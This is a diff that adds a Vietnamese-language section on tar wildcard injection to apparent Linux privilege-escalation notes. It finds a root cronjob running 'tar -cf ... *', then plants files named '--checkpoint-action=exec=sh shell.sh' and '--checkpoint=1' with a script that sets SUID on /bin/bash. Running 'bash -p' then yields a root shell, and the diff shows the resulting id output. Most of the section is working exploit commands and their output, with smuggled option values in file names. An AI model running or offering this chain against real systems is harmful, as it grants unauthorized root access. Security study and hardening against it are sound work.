@@ -84,3 +84,73 @@ $ find /usr/ -name "*cc1*" 2>/dev/null
 
 $ export PATH=$PATH:/usr/libexec/gcc/x86_64-redhat-linux/4.8.2/
 ```
+
+# 5. Wildcard injection
+
+Với một số tool nén file như `tar`, `zip`, `rync` và `7z`, có options cho phép chạy câu lệnh hệ thống, và đây là điều xảy ra khi thay tên file thành các options đó.
+
+Ví dụ, có một cronjob như sau:
+
+```console 
+$ cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
+...
+...
+*/3 * * * * root /opt/backup.sh
+```
+
+Check perms của `/opt/backup.sh`:
+
+```console 
+$ ls -l /opt/backup.sh
+-rwxr--r-- 1 root root 63 Aug 30 15:49 backup.sh
+```
+
+Nội dung của `/opt/backup.sh`:
+
+```console 
+$ cat /opt/backup.sh
+#!/bin/bash
+
+cd /var/www/html
+tar -cf /opt/backup/backup.tgz *
+```
+
+Exploit:
+
+```console
+$ cd /var/www/html
+$ echo -e '#/!bin/bash\nchmod +s /bin/bash' > shell.sh
+$ echo "" > "--checkpoint-action=exec=sh shell.sh"
+$ echo "" > --checkpoint=1
+```
+
+Lúc này trong `/var/www/html` sẽ có 3 file như sau:
+
+```console 
+$ ls
+...
+...
+'--checkpoint=1'
+'--checkpoint-action=exec=sh shell.sh'
+...
+...
+shell.sh
+```
+
+Đợi khoảng 3 phút, ta thấy `bash` đã được set SUID:
+
+```console
+$ ls -l /bin/bash
+-rwsr-sr-x 1 root root 1234376 Mar 28 01:40 /bin/bash
+```
+
+Đến bước này chỉ cần:
+```console
+$ /bin/bash -p
+
+bash-5.1# id
+uid=1000(user) gid=1003(user) euid=0(root) egid=0(root) groups=0(root),...
+```
+
+Ngoài ra còn nhiều trò khác tại [đây](https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/) và [đây](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks)
+
